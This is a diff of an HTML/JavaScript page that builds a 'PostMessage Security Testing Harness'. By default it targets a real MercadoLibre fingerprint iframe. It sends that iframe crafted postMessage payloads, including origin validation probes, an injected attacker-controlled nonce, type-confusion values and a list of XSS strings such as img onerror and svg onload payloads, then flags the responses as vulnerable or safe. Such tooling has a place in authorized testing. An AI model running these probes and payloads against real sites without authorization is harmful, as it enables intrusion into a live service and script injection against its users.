@@ -1,28 +1,383 @@
 <!DOCTYPE html>
-<html>
-<head><title>Origin Test</title></head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PostMessage Security Testing</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 { color: #333; margin-top: 0; }
+        h2 { color: #555; border-bottom: 2px solid #007bff; padding-bottom: 5px; }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            margin: 5px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        button:hover { background: #0056b3; }
+        button:active { background: #004085; }
+        .danger { background: #dc3545; }
+        .danger:hover { background: #c82333; }
+        .warning { background: #ffc107; color: #000; }
+        .warning:hover { background: #e0a800; }
+        #log {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .log-entry {
+            margin-bottom: 8px;
+            padding: 4px;
+            border-left: 3px solid #00ff00;
+            padding-left: 8px;
+        }
+        .log-error { color: #ff4444; border-left-color: #ff4444; }
+        .log-success { color: #44ff44; border-left-color: #44ff44; }
+        .log-warning { color: #ffaa00; border-left-color: #ffaa00; }
+        .log-info { color: #00aaff; border-left-color: #00aaff; }
+        input, textarea {
+            width: 100%;
+            padding: 8px;
+            margin: 5px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+        }
+        textarea { min-height: 80px; }
+        .test-group {
+            background: #f8f9fa;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 4px;
+            border-left: 4px solid #007bff;
+        }
+        iframe {
+            width: 100%;
+            height: 300px;
+            border: 2px solid #007bff;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+        .status {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .status-vulnerable { background: #dc3545; color: white; }
+        .status-safe { background: #28a745; color: white; }
+        .status-unknown { background: #6c757d; color: white; }
+    </style>
+</head>
 <body>
-<h1>PostMessage Origin Test</h1>
-<iframe id="target" src="https://www.mercadolibre.com/jms/lgz/fingerprint/iframe"></iframe>
+    <div class="container">
+        <h1>🔍 PostMessage Security Testing Harness</h1>
+        <p>Test for postMessage vulnerabilities in target applications</p>
+    </div>
 
-<script>
-setTimeout(() => {
-    const iframe = document.getElementById('target');
-    
-    // Test 1: Send message from our origin
-    iframe.contentWindow.postMessage({
-        action: 'setJsuuid',
-        value: 'test-uuid-12345',
-        nonce: 'attacker-nonce'
-    }, '*');
-    
-    // Listen for response
-    window.addEventListener('message', (e) => {
-        console.log('Received response:', e);
-        console.log('Origin:', e.origin);
-        console.log('Data:', e.data);
-    });
-}, 2000);
-</script>
+    <div class="container">
+        <h2>Target Configuration</h2>
+        <label>Target URL:</label>
+        <input type="text" id="targetUrl" value="https://www.mercadolibre.com/jms/lgz/fingerprint/iframe" placeholder="https://example.com/iframe">
+        <button onclick="loadTarget()">Load Target</button>
+        <button onclick="clearLog()" class="warning">Clear Log</button>
+    </div>
+
+    <div class="container">
+        <iframe id="targetFrame" style="display:none;"></iframe>
+    </div>
+
+    <div class="container">
+        <h2>Test Suite</h2>
+        
+        <div class="test-group">
+            <h3>1. Origin Validation Test <span id="status1" class="status status-unknown">Not Tested</span></h3>
+            <p>Tests if the iframe accepts messages from arbitrary origins</p>
+            <button onclick="testOriginValidation()">Run Test</button>
+        </div>
+
+        <div class="test-group">
+            <h3>2. Nonce Manipulation Test <span id="status2" class="status status-unknown">Not Tested</span></h3>
+            <p>Tests if we can inject/override nonce values</p>
+            <button onclick="testNonceManipulation()">Run Test</button>
+        </div>
+
+        <div class="test-group">
+            <h3>3. XSS Payload Test <span id="status3" class="status status-unknown">Not Tested</span></h3>
+            <p>Tests input validation with various XSS payloads</p>
+            <button onclick="testXSSPayloads()">Run Test</button>
+        </div>
+
+        <div class="test-group">
+            <h3>4. Type Confusion Test <span id="status4" class="status status-unknown">Not Tested</span></h3>
+            <p>Tests handling of unexpected data types</p>
+            <button onclick="testTypeConfusion()">Run Test</button>
+        </div>
+
+        <div class="test-group">
+            <h3>5. Custom Payload Test <span id="status5" class="status status-unknown">Not Tested</span></h3>
+            <label>Action:</label>
+            <input type="text" id="customAction" value="setJsuuid" placeholder="action">
+            <label>Value:</label>
+            <textarea id="customValue" placeholder='{"your": "payload"}'></textarea>
+            <label>Nonce:</label>
+            <input type="text" id="customNonce" value="test-nonce" placeholder="nonce">
+            <button onclick="testCustomPayload()">Send Custom Payload</button>
+        </div>
+
+        <div class="test-group">
+            <h3>Run All Tests</h3>
+            <button onclick="runAllTests()" class="danger">Execute Full Test Suite</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>Log Output</h2>
+        <div id="log"></div>
+    </div>
+
+    <script>
+        let iframe;
+        let messageListener;
+        let testResults = {};
+
+        function log(message, type = 'info') {
+            const logDiv = document.getElementById('log');
+            const timestamp = new Date().toLocaleTimeString();
+            const entry = document.createElement('div');
+            entry.className = `log-entry log-${type}`;
+            entry.textContent = `[${timestamp}] ${message}`;
+            logDiv.appendChild(entry);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        function clearLog() {
+            document.getElementById('log').innerHTML = '';
+            log('Log cleared', 'info');
+        }
+
+        function updateStatus(testNum, status) {
+            const statusEl = document.getElementById(`status${testNum}`);
+            statusEl.className = `status status-${status}`;
+            statusEl.textContent = status === 'vulnerable' ? 'VULNERABLE' : status === 'safe' ? 'SAFE' : 'UNKNOWN';
+        }
+
+        function loadTarget() {
+            const url = document.getElementById('targetUrl').value;
+            iframe = document.getElementById('targetFrame');
+            iframe.src = url;
+            iframe.style.display = 'block';
+            
+            log(`Loading target: ${url}`, 'info');
+            
+            // Remove old listener if exists
+            if (messageListener) {
+                window.removeEventListener('message', messageListener);
+            }
+            
+            // Setup message listener
+            messageListener = (event) => {
+                log(`📨 Message received from: ${event.origin}`, 'success');
+                log(`Data: ${JSON.stringify(event.data, null, 2)}`, 'info');
+                
+                // Analyze response
+                if (event.data && event.data.action) {
+                    testResults[event.data.action] = event.data;
+                }
+            };
+            
+            window.addEventListener('message', messageListener);
+            
+            iframe.onload = () => {
+                log('✅ Target loaded successfully', 'success');
+            };
+            
+            iframe.onerror = () => {
+                log('❌ Failed to load target', 'error');
+            };
+        }
+
+        function sendMessage(action, value, nonce = 'test-nonce') {
+            if (!iframe || !iframe.contentWindow) {
+                log('❌ No iframe loaded. Please load target first.', 'error');
+                return;
+            }
+            
+            const payload = { action, value, nonce };
+            log(`📤 Sending: ${JSON.stringify(payload)}`, 'info');
+            
+            try {
+                iframe.contentWindow.postMessage(payload, '*');
+                log('✅ Message sent successfully', 'success');
+            } catch (e) {
+                log(`❌ Error sending message: ${e.message}`, 'error');
+            }
+        }
+
+        function testOriginValidation() {
+            log('🧪 TEST 1: Origin Validation', 'warning');
+            log('Testing if iframe accepts messages from arbitrary origins...', 'info');
+            
+            sendMessage('setJsuuid', 'origin-test-value-12345', 'origin-test-nonce');
+            
+            setTimeout(() => {
+                if (testResults['setJsuuid']) {
+                    log('⚠️ VULNERABLE: Iframe accepted message from arbitrary origin!', 'error');
+                    updateStatus(1, 'vulnerable');
+                } else {
+                    log('✅ SAFE: No response received (may have origin validation)', 'success');
+                    updateStatus(1, 'safe');
+                }
+            }, 2000);
+        }
+
+        function testNonceManipulation() {
+            log('🧪 TEST 2: Nonce Manipulation', 'warning');
+            log('Testing if we can inject attacker-controlled nonce...', 'info');
+            
+            const attackerNonce = 'ATTACKER_CONTROLLED_NONCE_' + Math.random();
+            sendMessage('setJsuuid', 'nonce-test-value', attackerNonce);
+            
+            setTimeout(() => {
+                sendMessage('setIdbuuid', 'verify-nonce-persistence', 'different-nonce');
+            }, 1000);
+            
+            setTimeout(() => {
+                if (testResults['setJsuuid'] && testResults['setJsuuid'].status === 'success') {
+                    log('⚠️ VULNERABLE: Successfully manipulated nonce value!', 'error');
+                    updateStatus(2, 'vulnerable');
+                } else {
+                    log('✅ SAFE: Nonce manipulation failed or no response', 'success');
+                    updateStatus(2, 'safe');
+                }
+            }, 3000);
+        }
+
+        function testXSSPayloads() {
+            log('🧪 TEST 3: XSS Payload Testing', 'warning');
+            
+            const payloads = [
+                '<img src=x onerror=alert(1)>',
+                '"><script>alert(1)</script>',
+                'javascript:alert(1)',
+                '{{7*7}}',
+                '${7*7}',
+                '<svg/onload=alert(1)>',
+                '\'"><img src=x onerror=alert(1)>',
+            ];
+            
+            log(`Testing ${payloads.length} XSS payloads...`, 'info');
+            
+            payloads.forEach((payload, index) => {
+                setTimeout(() => {
+                    log(`Payload ${index + 1}: ${payload}`, 'info');
+                    sendMessage('setJsuuid', payload, 'xss-test-nonce');
+                }, index * 500);
+            });
+            
+            setTimeout(() => {
+                log('⚠️ Check browser console and DOM for any XSS execution', 'warning');
+                log('If alert() fired or scripts executed, this is VULNERABLE', 'warning');
+                updateStatus(3, 'unknown');
+            }, payloads.length * 500 + 1000);
+        }
+
+        function testTypeConfusion() {
+            log('🧪 TEST 4: Type Confusion Testing', 'warning');
+            
+            const payloads = [
+                { desc: 'null', value: null },
+                { desc: 'undefined', value: undefined },
+                { desc: 'object', value: { nested: 'object' } },
+                { desc: 'array', value: ['array', 'values'] },
+                { desc: 'number', value: 123456 },
+                { desc: 'boolean', value: true },
+            ];
+            
+            payloads.forEach((payload, index) => {
+                setTimeout(() => {
+                    log(`Testing ${payload.desc} type...`, 'info');
+                    sendMessage('setJsuuid', payload.value, 'type-test');
+                }, index * 500);
+            });
+            
+            setTimeout(() => {
+                log('Check for any error messages or unexpected behavior', 'warning');
+                updateStatus(4, 'unknown');
+            }, payloads.length * 500 + 1000);
+        }
+
+        function testCustomPayload() {
+            log('🧪 TEST 5: Custom Payload', 'warning');
+            
+            const action = document.getElementById('customAction').value;
+            let value = document.getElementById('customValue').value;
+            const nonce = document.getElementById('customNonce').value;
+            
+            // Try to parse as JSON if it looks like JSON
+            if (value.trim().startsWith('{') || value.trim().startsWith('[')) {
+                try {
+                    value = JSON.parse(value);
+                } catch (e) {
+                    log('Note: Value is not valid JSON, sending as string', 'warning');
+                }
+            }
+            
+            sendMessage(action, value, nonce);
+            updateStatus(5, 'unknown');
+        }
+
+        function runAllTests() {
+            if (!iframe || !iframe.contentWindow) {
+                log('❌ Please load target first!', 'error');
+                return;
+            }
+            
+            log('🚀 RUNNING FULL TEST SUITE', 'warning');
+            log('═'.repeat(50), 'info');
+            
+            clearLog();
+            
+            setTimeout(() => testOriginValidation(), 1000);
+            setTimeout(() => testNonceManipulation(), 5000);
+            setTimeout(() => testXSSPayloads(), 10000);
+            setTimeout(() => testTypeConfusion(), 16000);
+            
+            setTimeout(() => {
+                log('═'.repeat(50), 'info');
+                log('✅ All tests completed. Review results above.', 'success');
+            }, 22000);
+        }
+
+        // Initialize
+        log('🔧 Testing harness initialized', 'success');
+        log('Please load a target URL to begin testing', 'info');
+    </script>
 </body>
 </html>
